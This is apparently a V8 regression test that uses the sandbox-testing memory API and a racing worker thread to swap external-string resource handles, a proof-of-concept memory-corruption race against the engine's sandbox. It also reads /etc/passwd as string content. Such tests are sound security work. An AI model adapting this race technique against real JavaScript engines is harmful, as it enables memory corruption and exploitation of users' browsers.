// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing --use-external-strings

const kStateIdx = 0;
const kTargetAddressIdx = 1;
const kTargetValueIdx = 2;

let sab;
for (let i = 0; i < 100; i++) {
  sab = new SharedArrayBuffer(64);
  if (Sandbox.getAddressOf(sab) % 8 === 0) break;
}

let flag = new BigInt64Array(sab);
let worker = new Worker(`
  const kStateIdx = 0;
  const kTargetAddressIdx = 1;
  const kTargetValueIdx = 2;

  onmessage = function(msg) {
    let sab = msg.data;
    let flag = new BigInt64Array(sab);
    let mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
    postMessage("ready");
    while (true) {
      while (Atomics.load(flag, kStateIdx) !== 1n) {
        if (Atomics.load(flag, kStateIdx) === -1n) return;
      }
      let addr = Number(Atomics.load(flag, kTargetAddressIdx));
      let val = Number(Atomics.load(flag, kTargetValueIdx));

      while (Atomics.load(flag, kStateIdx) === 1n) {
        mem.setUint32(addr, val, true);
      }
    }
  };
`, {type: 'string'});

worker.postMessage(sab);
worker.getMessage(); // wait for ready

let mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

let max_delay = 10000000;
let steps = 200;
let step_size = max_delay / steps;

for (let iter = 0; iter < steps; iter++) {
  let main_delay = Math.max(0, max_delay - iter * step_size);

  let content1 = read("/etc/passwd");
  let content2 = read("/etc/passwd");

  let resource_offset = Sandbox.getFieldOffset(
      Sandbox.getInstanceTypeIdOf(content1), "resource");

  let addr1 = Sandbox.getAddressOf(content1);
  let addr2 = Sandbox.getAddressOf(content2);

  let handle1 = mem.getUint32(addr1 + resource_offset, true);
  let handle2 = mem.getUint32(addr2 + resource_offset, true);

  mem.setUint32(addr1 + resource_offset, handle2, true);

  Atomics.store(flag, kTargetAddressIdx, BigInt(addr1 + resource_offset));
  Atomics.store(flag, kTargetValueIdx, BigInt(handle1));
  Atomics.store(flag, kStateIdx, 1n);

  let x = 0;
  for (let d = 0; d < main_delay; d++) { x += d; }

  let obj = {};
  obj[content1] = 42;

  Atomics.store(flag, kStateIdx, 0n);

  try {
    let len = content2.length;
    let char = content2.charCodeAt(0);

    for(let i=0; i < 0x1000; i++) {
        let check = content2.charCodeAt(i);
    }
  } catch(e) {}
}

Atomics.store(flag, kStateIdx, -1n);
